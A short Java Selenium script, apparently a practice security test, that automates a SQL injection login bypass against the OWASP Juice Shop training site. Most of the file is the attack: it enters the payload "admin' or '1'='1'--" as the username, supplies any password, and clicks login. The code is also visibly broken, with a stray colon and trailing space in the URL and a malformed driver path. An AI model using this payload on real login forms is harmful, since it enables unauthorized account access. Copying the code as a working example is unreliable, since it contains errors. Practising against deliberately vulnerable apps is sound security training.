package com.selenium;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
    public class SqlInjectionTest {
            public static void main(String[] args) {
                // Set the path to the ChromeDriver executable
                System.setProperty("webdriver.chrome.driver", "\\C:\\Users\\Kanchan\\Downloads\\chromedriver_win32\\chromedriver.exe\\");

                // Set ChromeOptions to handle browser settings
                ChromeOptions options = new ChromeOptions();
                options.addArguments("--start-maximized");

                // Initialize the ChromeDriver
                WebDriver driver = new ChromeDriver(options);

                try {
                    // Open the sample web application login page
                    driver.get(":https://juice-shop.herokuapp.com/#/login ");

                    // Locate the username and password fields
                    WebElement usernameField = driver.findElement(By.name("username"));
                    WebElement passwordField = driver.findElement(By.name("password"));
                    WebElement loginButton = driver.findElement(By.name("login"));

                    // Input a SQL injection payload in the username field
                    String sqlInjectionPayload = "admin' or '1'='1'--";

                    // Fill in the fields
                    usernameField.sendKeys(sqlInjectionPayload);
                    passwordField.sendKeys("anything"); // Password can be anything since the payload bypasses it

                    // Click the login button
                    loginButton.click();

                    // Optionally, you can print the page title to verify login success
                    System.out.println("Page title after login: " + driver.getTitle());

                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    // Close the browser
                    driver.quit();
                }
            }
        }
